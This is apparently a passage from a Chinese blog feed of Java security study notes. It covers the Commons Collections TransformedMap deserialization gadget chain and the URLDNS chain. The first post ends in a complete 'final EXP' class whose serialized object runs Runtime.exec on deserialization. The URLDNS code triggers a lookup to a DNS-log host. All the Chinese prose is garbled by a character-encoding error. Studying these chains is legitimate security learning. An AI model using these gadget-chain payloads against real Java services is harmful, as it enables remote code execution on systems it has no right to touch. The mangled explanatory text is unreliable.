org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//Áî®‰∫éËß£ÂÜ≥Á¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåRuntime‰∏çËÉΩË¢´Â∫èÂàóÂåñ  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">        chainedTransformer.transform(Runtime.class);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//ËøôÈáåÂàõÂª∫‰∏Ä‰∏™hashmapÂØπË±°ÊòØÂõ†‰∏∫decorateTransformÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫mapÂØπË±°  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;key&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Override.class, decorateMap);  </span><br><span class="line">        <span class="comment">//Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Ëß£ÂÜ≥‰º†ÂÖ•ÂØπË±°‰∏ç‰∏∫RuntimeÂØπË±°"><a href="#Ëß£ÂÜ≥‰º†ÂÖ•ÂØπË±°‰∏ç‰∏∫RuntimeÂØπË±°" class="headerlink" title="Ëß£ÂÜ≥‰º†ÂÖ•ÂØπË±°‰∏ç‰∏∫RuntimeÂØπË±°"></a>Ëß£ÂÜ≥‰º†ÂÖ•ÂØπË±°‰∏ç‰∏∫RuntimeÂØπË±°</h3><p>ËøôÈáåÊâæÂà∞ConstantTransfomerÔºåÁúãÂÆÉÈáåÈù¢ÁöÑ‰∏§‰∏™ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149259.png" alt="image-20230426214930163"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();  </span><br><span class="line">    iConstant = constantToReturn;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> iConstant;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>transformÊñπÊ≥ïËøîÂõûÊûÑÈÄ†ÂáΩÊï∞‰∏≠‰º†ÂÖ•ÁöÑÂèÇÊï∞ÔºåÈÇ£‰πàÊéßÂà∂ÂÖ∂ËøîÂõûRuntime.classÂ∞±Ëß£ÂÜ≥‰∫ÜËøô‰∏™ÈóÆÈ¢ò<br>ÊâÄ‰ª•Áé∞Âú®payload‰∏∫</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">&#125;;  </span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">map.put(<span class="string">&quot;kkk&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  </span><br><span class="line">Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHdConstructor</span> <span class="operator">=</span>  c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class,Map.class&#125;);  <span class="comment">//Ëé∑ÂèñÁ±ªÁöÑÊûÑÈÄ†ÊñπÊ≥ï  </span></span><br><span class="line">annotationInvocationHdConstructor.setAccessible(<span class="literal">true</span>); <span class="comment">//‰øùËØÅÂèØ‰ª•ËÆøÈóÆ  </span></span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHdConstructor.newInstance(Override.class, transformedMap);  </span><br><span class="line">serialize(o);  </span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="Ëß£ÂÜ≥‰∏§‰∏™ifÈóÆÈ¢ò"><a href="#Ëß£ÂÜ≥‰∏§‰∏™ifÈóÆÈ¢ò" class="headerlink" title="Ëß£ÂÜ≥‰∏§‰∏™ifÈóÆÈ¢ò"></a>Ëß£ÂÜ≥‰∏§‰∏™ifÈóÆÈ¢ò</h3><p>ÈÄöËøáË∞ÉËØïÂèëÁé∞ÔºåËøôÈáå‰∏ç‰ºöËøõÂÖ•if‰ºöÁõ¥Êé•Ë∑≥ËøásetValue<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262149733.png" alt="image-20230426214954634"><br>Êàë‰ª¨ÂæÄ‰∏äÂàÜÊûê‰∏Ä‰∏ãmemberTypeÁöÑÊù•Ê∫êÁúãÁúãÂÆÉÁöÑ‰ΩúÁî®<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150959.png" alt="image-20230426215001865"><br>ÂèØ‰ª•ÁúãÂà∞ÂÆÉÊòØËé∑Âèñ‰º†ÂèÇ‰∏≠Ê≥®Ëß£ÁöÑÊàêÂëòÊñπÊ≥ïÔºåÊâÄ‰ª•memberType‰∏çËÉΩ‰∏∫Á©∫Âç≥Ê≥®Ëß£ÁöÑÊàêÂëòÊñπÊ≥ï‰∏çËÉΩ‰∏∫Á©∫ÔºåÁÑ∂ÂêéÂéªÊâæ‰º†ÂÖ•ÁöÑÊ≥®Ëß£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150779.png" alt="image-20230426215011729"><br>ÂèØ‰ª•ÁúãÂà∞Ê≥®Ëß£‰∏∫OverrideÔºåÁÇπËøõÂéªÁúãÁúã<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262150156.png" alt="image-20230426215022091"><br>‰∏∫Á©∫ÔºåÊâÄ‰ª•Ëøô‰∏™Ê≥®Ëß£‰∏çË°åÔºåÁî®<code>Target.class</code> Â∞ùËØï‰∏Ä‰∏ãÔºåÁÇπËøõ <code>Target</code>ÔºåÂΩì‰∏≠Êúâ‰∏Ä‰∏™ÊàêÂëòÂèòÈáè‰∏∫ <code>value</code>ÔºåÊâÄ‰ª•Êàë‰ª¨ <code>hashmap.put</code> ‰πüÈúÄË¶Å‰øÆÊîπ‰∏∫ <code>value</code>ÔºåÂõ†‰∏∫Á¨¨‰∫å‰∏™ifÂ∞±ÊòØÂà§Êñ≠ÊàêÂëòÂèòÈáè‰∏éhashMap‰º†ÂÖ•ÁöÑÂèÇÊï∞ÊòØÂê¶Áõ∏Á≠âÔºå‰øÆÊîπÂÆå‰πãÂêéÂà∞ÁªìÊùü‰∫Ü</p><h3 id="ÊúÄÁªàEXP"><a href="#ÊúÄÁªàEXP" class="headerlink" title="ÊúÄÁªàEXP"></a>ÊúÄÁªàEXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="comment">//Áî®‰∫éËß£ÂÜ≥Á¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåRuntime‰∏çËÉΩË¢´Â∫èÂàóÂåñ  </span></span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)  </span><br><span class="line">        &#125;;  </span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">//ËøôÈáåÂàõÂª∫‰∏Ä‰∏™hashmapÂØπË±°ÊòØÂõ†‰∏∫decorateTransformÊñπÊ≥ïÁ¨¨‰∏Ä‰∏™ÂèÇÊï∞‰∏∫mapÂØπË±°  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Class.class, Map.class&#125;);  </span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, decorateMap);  </span><br><span class="line">        <span class="comment">//Â∫èÂàóÂåñ‰∏éÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line">        serialize(o);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂºπÂá∫ÊàêÂäü<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151916.png" alt="image-20230426215110821"></p><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>Áúã‰∏Ä‰∏ãÊï¥‰∏™ÁöÑÂà©Áî®Èìæ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransfomer#transform</span><br><span class="line">   TransformedMap#checkSetValue</span><br><span class="line">      AbstractInputCheckedMapDecorator#setValue</span><br><span class="line">         AnnotationInvocation#readObject</span><br><span class="line"></span><br><span class="line">ËæÖÂä©Âà©Áî®Èìæ</span><br><span class="line">ConstantTransformer</span><br><span class="line">ChainedTransformer</span><br><span class="line">HashMap</span><br></pre></td></tr></table></figure><p>ÊµÅÁ®ãÂõæ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304262151401.png" alt="image-20230426215124329"><br>ÊÑüËßâË∑üÂÆåËøòÊòØÊúâÁÇπÊáµÔºå‰∏çÁü•ÈÅìÂ¶Ç‰ΩïÂà©Áî®ÔºåËøòÊòØÂæóÂÆûÈôÖËøêÁî®‰∏Ä‰∏ã</p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãURLDNSÈìæ</title>
      <link href="/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS%E9%93%BE/"/>
      <url>/2023/04/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<p>ÂÖàÊîæ‰ª£Á†ÅÔºåÊÑüËßâËøòÊòØËá™Â∑±Ë∑üÁùÄËßÜÈ¢ëÊâãÂÜô‰∏ÄÈÅçÊõ¥Â•ΩÁêÜËß£ÔºåÂæàÂ§öÁêÜËß£ÊîæÂú®Ê≥®Èáä‰∏≠‰∫Ü</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap; <span class="comment">//ÂÖ•Âè£Á±ª  </span></span><br><span class="line"><span class="keyword">import</span> java.net.URL;  <span class="comment">//Ë∞ÉÁî®Èìæ‰∏≠ÁöÑÁ±ª  </span></span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        HashMap &lt;URL,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://vnmkzfpuho.dnstunnel.run&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ÈÄöËøáÂèçÂ∞ÑËé∑ÂèñÂà∞url‰∏≠ÁöÑhashcodeÂ±ûÊÄß  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);  </span><br><span class="line">        <span class="comment">//hashcode‰∏∫ÁßÅÊúâÂ±ûÊÄßÔºåÈÄöËøá‰∏ãÈù¢ÊñπÊ≥ïËÆæÁΩÆ‰∏∫ÂèØÊìç‰Ωú  </span></span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ËøôÈáåÂú®putÂâçÈúÄË¶ÅÂ∞ÜhashCodeÂÄºÊîπ‰∏Ä‰∏ãÔºå‰∏çÁÑ∂putÊñπÊ≥ï‰πü‰ºöËØ∑Ê±ÇdnsÔºåËøôÊ†∑‰∏çÁÆ°ÊúâÊ≤°ÊúâÂèçÂ∫èÂàóÂåñÈÉΩ‰ºöËØ∑Ê±Çdns  </span></span><br><span class="line">  </span><br><span class="line">        field.set(url,<span class="number">2</span>);  <span class="comment">//ÈáçÊñ∞ËÆæÔºåÈÅøÂÖçÊ∑∑Ê∑Ü  </span></span><br><span class="line">  </span><br><span class="line">        hashMap.put(url,<span class="number">2</span>);  </span><br><span class="line">  </span><br><span class="line">        field.set(url,-<span class="number">1</span>);  <span class="comment">//ÊîπÂõûÔºå‰∏çÁÑ∂ËøôÊù°ÈìæÂ∞±‰∏çËÉΩÂà©Áî®  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ËøõË°åÂ∫èÂàóÂåñ  </span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">w</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        w.writeObject(hashMap);  </span><br><span class="line">        System.out.println(w);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ËøõË°åÂèçÂ∫èÂàóÂåñ  </span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;bin.ser&quot;</span>));  </span><br><span class="line">        o.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h2><p>Áúã‰∏Ä‰∏ãÂ§ß‰Ω¨ÊÄªÁªìÁöÑÂéüÁêÜ<br><em><strong>java.util.HashMap ÈáçÂÜô‰∫Ü readObject, Âú®ÂèçÂ∫èÂàóÂåñÊó∂‰ºöË∞ÉÁî® hash ÂáΩÊï∞ËÆ°ÁÆó key ÁöÑ hashCode.ËÄå java.net.URL ÁöÑ hashCode Âú®ËÆ°ÁÆóÊó∂‰ºöË∞ÉÁî® getHostAddress Êù•Ëß£ÊûêÂüüÂêç, ‰ªéËÄåÂèëÂá∫ DNS ËØ∑Ê±Ç.</strong></em></p><h2 id="ÂºÄÂßãÂàÜÊûê"><a href="#ÂºÄÂßãÂàÜÊûê" class="headerlink" title="ÂºÄÂßãÂàÜÊûê"></a>ÂºÄÂßãÂàÜÊûê</h2><p>ËøõÂÖ•Âà∞hashMapÁ±ª‰∏≠ÂèØ‰ª•ÁúãÂà∞ÂÆÉÊúâÂ∫èÂàóÂåñÁöÑÊé•Âè£<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232239690.png" alt="image-20230422211906952"><br>Âπ∂‰∏îÈáçÂÜô‰∫ÜreadObjectÔºåËøô‰∏™ÊñπÊ≥ïÁî®‰∫éÂ∫èÂàóÂåñÊï∞ÊçÆÔºåÂú®Java‰∏≠ÔºåÂ¶ÇÊûúreadObjectË¢´ÈáçÂÜôÈÇ£‰πàÈ¶ñÂÖà‰ºöË∞ÉÁî®ÈáçÂÜôÁöÑreadObjectÔºå‰∏ãÈù¢ËøôÈáåÁöÑs‰∏∫ËæìÂÖ•ÊµÅËØÅÊòéÂèØÊéß<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242194.png" alt="image-20230423224233141"><br>ÂºÄÂßãË∞ÉËØïÔºåÈ¶ñÂÖàÁõ¥Êé•Âú®‰∏ãÈù¢ËøôÈáåËøõÂÖ•hashMapÁ±ª<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242993.png" alt="image-20230423224245956"><br>ÁÑ∂ÂêéÊâæÂà∞readObjectÊñπÊ≥ïÂú®putVal()ÊñπÊ≥ï‰ΩçÁΩÆ‰∏ãÊñ≠ÁÇπ<br><img src="https://raw.githubusercontent.com/Joker2763/img/master/blogimg/202304232242372.png" alt="image-20230423224257331"><br>ËøôÈáåhash()ÊñπÊ≥ïÂØπkeyÂÄºÈáçÊñ∞ËøõË°å‰∫ÜËÆ°ÁÆóËÄåkeyÂÄº‰∏∫URLÁ±ªÁöÑÂØπË±°ÔºåË∑üËøõÁúã‰∏Ä‰∏ã<br><img 